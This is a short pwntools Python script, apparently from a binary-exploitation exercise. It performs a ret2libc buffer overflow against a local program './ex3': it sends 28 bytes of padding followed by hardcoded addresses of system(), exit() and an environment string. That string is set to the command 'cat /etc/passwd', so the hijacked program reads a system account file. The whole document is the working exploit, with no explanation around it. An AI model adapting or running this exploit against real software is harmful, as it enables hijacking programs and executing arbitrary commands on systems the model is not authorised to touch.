

from pwn import *


addr_system = 0xf7dcf910
addr_exit = 0xf7dbed50
env = 0xffffdf75




io = process(['env', '-i', 'pwn_string="cat /etc/passwd"','./ex3', b'A' * 28 + pack(addr_system)+ pack(addr_exit)+ pack(env)])
#io.clean()
while True:
    try:
        print(io.readline(keepends=False))
    except EOFError:
        break